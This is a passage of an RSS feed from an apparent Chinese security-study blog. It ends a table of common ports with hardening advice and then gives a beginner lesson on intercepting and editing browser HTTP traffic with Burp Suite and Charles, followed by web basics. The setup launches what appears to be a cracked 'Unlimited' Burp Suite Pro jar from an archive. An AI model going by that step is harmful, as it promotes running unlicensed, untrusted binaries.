          &lt;td&gt;明文接收邮件，无加密&lt;/td&gt;
          &lt;td&gt;客户端接收邮件（已淘汰）&lt;/td&gt;
          &lt;td&gt;用POP3S（995端口，加密）替代&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;143&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;IMAP（邮件接收）&lt;/td&gt;
          &lt;td&gt;支持邮件文件夹同步、标记管理，明文传输&lt;/td&gt;
          &lt;td&gt;客户端接收邮件（主流）&lt;/td&gt;
          &lt;td&gt;用IMAPS（993端口，加密）替代，开启邮件二次验证&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;389&lt;/td&gt;
          &lt;td&gt;TCP/UDP&lt;/td&gt;
          &lt;td&gt;LDAP（目录服务）&lt;/td&gt;
          &lt;td&gt;用于用户身份认证、组织架构管理（如企业内网）&lt;/td&gt;
          &lt;td&gt;企业内网身份验证&lt;/td&gt;
          &lt;td&gt;明文传输风险高，用LDAPS（636端口，加密）替代&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;445&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;SMB（文件共享）&lt;/td&gt;
          &lt;td&gt;Windows文件共享、打印机共享，支持跨设备访问&lt;/td&gt;
          &lt;td&gt;内网文件共享（Windows/Mac）&lt;/td&gt;
          &lt;td&gt;漏洞频发（如永恒之蓝），公网禁止开放；内网限制访问IP，关闭匿名登录&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;开发者常用端口注册端口1024-49151&#34;&gt;开发者常用端口（注册端口，1024-49151）
&lt;/h3&gt;&lt;p&gt;这类端口由应用程序注册使用，默认端口可配置修改，是开发、测试、部署中高频接触的端口。&lt;/p&gt;
&lt;h4 id=&#34;数据库端口&#34;&gt;数据库端口
&lt;/h4&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;端口号&lt;/th&gt;
          &lt;th&gt;协议&lt;/th&gt;
          &lt;th&gt;数据库/服务&lt;/th&gt;
          &lt;th&gt;核心特点&lt;/th&gt;
          &lt;th&gt;使用场景&lt;/th&gt;
          &lt;th&gt;安全注意事项&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;3306&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;MySQL/MariaDB&lt;/td&gt;
          &lt;td&gt;关系型数据库默认端口，支持主从复制、事务&lt;/td&gt;
          &lt;td&gt;Web开发、数据分析&lt;/td&gt;
          &lt;td&gt;公网禁止开放！内网绑定本地IP（127.0.0.1），设置强密码，限制访问IP&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;5432&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;PostgreSQL&lt;/td&gt;
          &lt;td&gt;开源关系型数据库，支持复杂查询、JSON数据&lt;/td&gt;
          &lt;td&gt;后端开发、大数据应用&lt;/td&gt;
          &lt;td&gt;同MySQL，禁用远程匿名访问，开启SSL加密&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1433&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;SQL Server&lt;/td&gt;
          &lt;td&gt;微软SQL Server数据库默认端口&lt;/td&gt;
          &lt;td&gt;.NET开发、企业应用&lt;/td&gt;
          &lt;td&gt;公网不开放，内网限制IP，启用Windows认证或混合认证&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;27017&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;MongoDB&lt;/td&gt;
          &lt;td&gt;文档型数据库，无Schema，支持分布式存储&lt;/td&gt;
          &lt;td&gt;大数据、API后端、NoSQL应用&lt;/td&gt;
          &lt;td&gt;默认无认证！需启用访问控制（用户名密码），绑定内网IP，禁止公网暴露&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;6379&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;Redis&lt;/td&gt;
          &lt;td&gt;内存缓存数据库，高性能，支持多种数据结构&lt;/td&gt;
          &lt;td&gt;缓存、会话存储、消息队列&lt;/td&gt;
          &lt;td&gt;高危！默认无密码，需设置密码、绑定本地IP、开启防火墙，禁用公网访问&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;9200&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;Elasticsearch&lt;/td&gt;
          &lt;td&gt;全文搜索引擎，支持分布式、实时检索&lt;/td&gt;
          &lt;td&gt;日志分析、全文搜索功能&lt;/td&gt;
          &lt;td&gt;禁用匿名访问，配置用户认证（如X-Pack），限制访问IP&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;web开发服务器端口&#34;&gt;Web开发/服务器端口
&lt;/h4&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;端口号&lt;/th&gt;
          &lt;th&gt;协议&lt;/th&gt;
          &lt;th&gt;服务/框架&lt;/th&gt;
          &lt;th&gt;核心特点&lt;/th&gt;
          &lt;th&gt;使用场景&lt;/th&gt;
          &lt;th&gt;安全注意事项&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;8080&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;通用Web端口&lt;/td&gt;
          &lt;td&gt;开发环境默认端口（如Tomcat、Nginx反向代理），非特权端口&lt;/td&gt;
          &lt;td&gt;本地开发测试、内网Web服务&lt;/td&gt;
          &lt;td&gt;公网部署需映射到80/443，禁止直接暴露8080；开启认证（如Basic Auth）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;8000&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;开发服务器&lt;/td&gt;
          &lt;td&gt;Python Flask/Django、Node.js默认开发端口&lt;/td&gt;
          &lt;td&gt;本地开发调试（如&lt;code&gt;python manage.py runserver&lt;/code&gt;）&lt;/td&gt;
          &lt;td&gt;仅用于本地测试，切勿公网开放（无安全防护）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;3000&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;Node.js/React&lt;/td&gt;
          &lt;td&gt;Node.js Express、React开发服务器默认端口&lt;/td&gt;
          &lt;td&gt;前端/Node.js后端开发&lt;/td&gt;
          &lt;td&gt;同8000，本地测试专用，公网需通过Nginx反向代理并配置HTTPS&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;4000&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;Hugo/Gatsby&lt;/td&gt;
          &lt;td&gt;Hugo开发服务器默认端口（&lt;code&gt;hugo server -p 4000&lt;/code&gt;）&lt;/td&gt;
          &lt;td&gt;静态博客本地预览（如GitHub Pages博客）&lt;/td&gt;
          &lt;td&gt;仅本地使用，无需公网开放，预览后部署到GitHub Pages（80/443端口）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;8096&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;Jellyfin&lt;/td&gt;
          &lt;td&gt;媒体服务器默认端口（Web管理界面+流媒体传输）&lt;/td&gt;
          &lt;td&gt;云/内网媒体库（如之前提到的Jellyfin）&lt;/td&gt;
          &lt;td&gt;公网访问需配置HTTPS（反向代理+SSL），设置强密码，限制登录IP&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;8888&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;Jupyter Notebook&lt;/td&gt;
          &lt;td&gt;Python交互式开发环境默认端口&lt;/td&gt;
          &lt;td&gt;数据分析、机器学习开发&lt;/td&gt;
          &lt;td&gt;本地使用需设置密码（&lt;code&gt;jupyter notebook password&lt;/code&gt;），公网需端口转发+HTTPS&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;其他开发工具端口&#34;&gt;其他开发工具端口
&lt;/h4&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;端口号&lt;/th&gt;
          &lt;th&gt;协议&lt;/th&gt;
          &lt;th&gt;工具/服务&lt;/th&gt;
          &lt;th&gt;核心特点&lt;/th&gt;
          &lt;th&gt;使用场景&lt;/th&gt;
          &lt;th&gt;安全注意事项&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;5900&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;VNC（远程桌面）&lt;/td&gt;
          &lt;td&gt;跨平台远程桌面控制，支持图形界面&lt;/td&gt;
          &lt;td&gt;远程操作桌面（如树莓派）&lt;/td&gt;
          &lt;td&gt;默认无加密，需开启VNC加密（如TightVNC），设置强密码，限制访问IP&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;3389&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;RDP（Windows远程桌面）&lt;/td&gt;
          &lt;td&gt;Windows自带远程桌面，图形界面流畅&lt;/td&gt;
          &lt;td&gt;Windows服务器/电脑远程控制&lt;/td&gt;
          &lt;td&gt;公网禁止开放！内网限制IP，开启网络级别认证（NLA），设置复杂密码&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;6000-6005&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;X11（Linux图形界面）&lt;/td&gt;
          &lt;td&gt;Linux/Unix图形界面传输端口&lt;/td&gt;
          &lt;td&gt;Linux远程图形界面访问&lt;/td&gt;
          &lt;td&gt;明文传输，风险高，建议用SSH隧道转发（&lt;code&gt;ssh -X user@server&lt;/code&gt;）替代&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;9090&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;Prometheus&lt;/td&gt;
          &lt;td&gt;监控系统默认端口（Web UI+API）&lt;/td&gt;
          &lt;td&gt;服务器/应用监控&lt;/td&gt;
          &lt;td&gt;公网需配置认证（如Basic Auth），限制访问IP，配合Grafana（3000端口）可视化&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
</description>
        </item>
        <item>
        <title>1.1 抓包和web基本知识</title>
        <link>https://www.retr0.qzz.io/p/1.1-%E6%8A%93%E5%8C%85%E5%92%8Cweb%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/</link>
        <pubDate>Mon, 17 Nov 2025 15:59:43 +0800</pubDate>
        
        <guid>https://www.retr0.qzz.io/p/1.1-%E6%8A%93%E5%8C%85%E5%92%8Cweb%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;本篇课程使用资源库内的“win10渗透测试工具预安装虚拟机（日常使用）”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;抓包&#34;&gt;抓包
&lt;/h1&gt;&lt;h2 id=&#34;环境准备&#34;&gt;环境准备
&lt;/h2&gt;&lt;h3 id=&#34;java环境准备&#34;&gt;Java环境准备
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;打开&lt;code&gt;C:\tools\alltools\java环境&lt;/code&gt;中的&lt;code&gt;jre-8u261-windows-x64.rar&lt;/code&gt;压缩包，解压并安装Java&lt;/li&gt;
&lt;li&gt;安装完成后按&lt;code&gt;win+R&lt;/code&gt;打开“运行”窗口，输入cmd并回车进入命令行控制台。&lt;/li&gt;
&lt;li&gt;分别输入&lt;code&gt;java&lt;/code&gt;和&lt;code&gt;javac&lt;/code&gt;均有内容返回则说明安装成功。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;burpsuite软件的准备&#34;&gt;Burpsuite软件的准备
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;打开&lt;code&gt;C:\tools\alltools\抓包工具&lt;/code&gt;中的&lt;code&gt;Burpsuitepro_Unlimited_jb51.rar&lt;/code&gt;压缩包并解压到合适的位置。&lt;/li&gt;
&lt;li&gt;在解压的文件夹内创建一个&lt;code&gt;.bat&lt;/code&gt;批处理文件用于启动Burpsuite，名称随便，内容为：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;java&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;jar&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BurpUnlimited&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;jar&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;双击该批处理文件即可启动Burpsuite,一路next进入软件界面。&lt;/li&gt;
&lt;li&gt;检查并确认Options选项卡中监听地址和端口为&lt;code&gt;127.0.0.1:8080&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://www.retr0.qzz.io/post/%e7%bd%91%e5%ae%89/img/1.1-1.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;firefox浏览器的准备需要开着burpsuite&#34;&gt;Firefox浏览器的准备（需要开着Burpsuite）
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;打开Firefox浏览器，并转到&lt;strong&gt;选项&lt;/strong&gt;中，在&lt;strong&gt;高级-网络-连接-设置&lt;/strong&gt;中选择“手动配置代理”并勾选为所有协议使用相同代理，填写好之前获取的地址和端口。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://www.retr0.qzz.io/post/%e7%bd%91%e5%ae%89/img/1.1-2.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;在地址栏输入&lt;code&gt;http://burp/&lt;/code&gt;能进入页面说明配置成功，接下来点击页面右上角的‘CA Certificate’按钮保存证书。&lt;/li&gt;
&lt;li&gt;再次转到浏览器的&lt;strong&gt;选项&lt;/strong&gt;中，在&lt;strong&gt;高级-证书-查看证书-证书机构-导入&lt;/strong&gt;中选择刚才保存到证书导入，弹窗内全部勾上。&lt;/li&gt;
&lt;li&gt;证书机构的列表中多出名为PortSwigger CA的证书则导入成功。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;charles软件的准备可选&#34;&gt;Charles软件的准备（可选）
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;打开位于&lt;code&gt;C:\tools\Charles&lt;/code&gt;内的&lt;code&gt;Charles.exe&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;点击&lt;strong&gt;代理&lt;/strong&gt;选项，可以看到默认勾选了Windows代理，说明Charles默认使用系统代理的方法抓包，也因此能抓取系统上所有软件的http数据包。&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;正如上述，我们需要在浏览器的代理设置中更改为：**使用系统代理 **（&lt;code&gt;1.1.3&lt;/code&gt;中提到）&lt;/li&gt;
&lt;li&gt;因为未知原因，charles的证书不能从本地保存后导入，所以这里我们选择 **帮助-SSL代理-在移动设备或远程浏览器上安装Charles根证书 **点击后出现弹窗，例如：&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://www.retr0.qzz.io/post/%e7%bd%91%e5%ae%89/img/1.1-3.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这里我们只看后面的&lt;code&gt;chls.pro/ssl&lt;/code&gt;在浏览器中访问该地址。&lt;/p&gt;
&lt;p&gt;安装证书的操作不再过多叙述。&lt;/p&gt;
&lt;h2 id=&#34;抓包实操&#34;&gt;抓包实操
&lt;/h2&gt;&lt;h3 id=&#34;burp抓包&#34;&gt;Burp抓包
&lt;/h3&gt;&lt;p&gt;在Burp软件内Proxy-Intercept选项卡中点击&lt;strong&gt;Intercept is off&lt;/strong&gt;开始抓包&lt;/p&gt;
&lt;p&gt;此时在百度上搜索任意关键词（以&amp;quot;test&amp;quot;为例）可以看到抓取到数据包&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://www.retr0.qzz.io/post/%e7%bd%91%e5%ae%89/img/1.1-4.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;修改数据包首行&lt;code&gt;wd&lt;/code&gt;参数值为&amp;quot;ok&amp;quot;&lt;/p&gt;
&lt;p&gt;点击&lt;strong&gt;Intercept is on&lt;/strong&gt;放行数据包&lt;/p&gt;
&lt;p&gt;发现搜索关键词被替换为&amp;quot;ok&amp;quot;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://www.retr0.qzz.io/post/%e7%bd%91%e5%ae%89/img/1.1-5.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;charles抓包&#34;&gt;Charles抓包
&lt;/h3&gt;&lt;p&gt;打开Charles软件并访问百度&lt;/p&gt;
&lt;p&gt;发现抓取到数据包，查看内容发现与页面原代码一致&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://www.retr0.qzz.io/post/%e7%bd%91%e5%ae%89/img/1.1-6.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h1 id=&#34;web基本知识&#34;&gt;web基本知识
&lt;/h1&gt;&lt;p&gt;一些术语：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;GET&lt;/strong&gt; 通过地址栏输入===从服务器获取&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;POST&lt;/strong&gt; 提交表单===向服务器发送&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;request&lt;/strong&gt; 向服务器发起一个请求，服务器会返回一个&lt;u&gt;结果(response)&lt;/u&gt;给客户端&lt;/p&gt;
&lt;p&gt;**forward **服务器内部发送重定向（网页发生改变但地址不变）&lt;/p&gt;
&lt;p&gt;**redirect **服务器收到一个请求后，发送一个状态给客户端，客户端会再次请求，此时url发生了改变&lt;/p&gt;
&lt;p&gt;**url **统一资源定位器（链接）&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;url的组成，以百度搜索为例：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;https:// www.baidu.com/ s ? wd=test &amp;amp; rsv_spt=1 &amp;amp; issp=1 &amp;amp; f=8&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;http:// == 协议&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.baidu.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;www.baidu.com&lt;/a&gt; == 域名&lt;/p&gt;
&lt;p&gt;s == 文件&lt;/p&gt;
&lt;p&gt;？== get请求&lt;/p&gt;
&lt;p&gt;wd/rsv_spt/issp/f == 参数名&lt;/p&gt;
&lt;p&gt;参数名等号后为参数值&lt;/p&gt;
&lt;p&gt;&amp;amp; == 连接符&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
